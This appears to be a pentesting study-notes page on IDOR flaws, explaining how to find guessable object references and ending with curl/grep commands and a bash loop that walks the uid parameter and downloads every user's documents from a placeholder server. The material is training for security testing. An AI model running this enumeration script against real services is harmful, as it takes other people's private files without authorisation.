---
layout: default
title: IDOR
permalink: /Web/idor/
---

# Insecure Direct Object Reference (IDOR)
IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. 
IDOR vulnerability mainly exists due to the lack of an access control on the back-end.

## Identifying IDORs
- Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies. We can use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.
- We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls.
- Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead.
- If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data. We can try repeating the same API calls while logged in as the other user to see if the web application returns anything.

## Mass Enumeration
We can either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files or write a small bash script to download all files.
If the HTML source code of the links to view file is the following:
```
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
```
We can use this command:
```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```
Use regex to get the document links:
```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```
Then we can use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link:
```
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
